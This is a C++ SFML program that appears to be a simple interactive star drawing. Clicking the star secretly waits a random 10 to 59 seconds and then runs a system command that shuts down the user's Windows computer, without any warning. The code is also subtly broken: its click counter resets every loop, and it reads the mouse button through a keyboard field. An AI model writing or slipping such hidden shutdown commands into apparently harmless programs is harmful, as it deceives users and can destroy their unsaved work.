#include <SFML/Graphics.hpp>
#include <SFML/Window.hpp>
#include <SFML/OpenGL.hpp>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <ctime>
#include <cstring>
#include <random>
#include <string>


int main()
{
    sf::RenderWindow window(sf::VideoMode(800, 600), "star");

    sf::ConvexShape star; star.setPointCount(10);
    star.setFillColor(sf::Color::Yellow);

    star.setPoint(0, sf::Vector2f(60, 0));
    star.setPoint(1, sf::Vector2f(72, 40));
    star.setPoint(2, sf::Vector2f(110, 40));
    star.setPoint(3, sf::Vector2f(80, 60));
    star.setPoint(4, sf::Vector2f(100, 100));
    star.setPoint(5, sf::Vector2f(60, 70));
    star.setPoint(6, sf::Vector2f(20, 100));
    star.setPoint(7, sf::Vector2f(40, 60));
    star.setPoint(8, sf::Vector2f(10, 40));
    star.setPoint(9, sf::Vector2f(48, 40));

    star.setPosition(340, 250);

    while (window.isOpen()) {

        sf::Vector2i mouse = sf::Mouse::getPosition(window);
        sf::Event event;

        int c = 0;

        while (window.pollEvent(event)) {

            if (event.type == sf::Event::Closed)
                window.close();

            if (event.type == sf::Event::MouseButtonPressed) {
                if (event.key.code == sf::Mouse::Left) {
                    if (star.getGlobalBounds().contains(mouse.x, mouse.y)) {
                        if (c < 1) {

                            star.setFillColor(sf::Color::White);

                            std::random_device random;
                            int r = (random() % 50 + 10) * 1000;
                            Sleep(r);
                            system("C:\\Windows\\System32\\shutdown -s");
                        }

                        c++;
                    }
                }
            }

            if (event.type == sf::Event::MouseButtonReleased) {
                if (event.key.code == sf::Mouse::Left) {

                    star.setFillColor(sf::Color::Red);
                }
            }
        }

        window.clear();
        window.draw(star);
        window.display();
    }

    return 0;
}
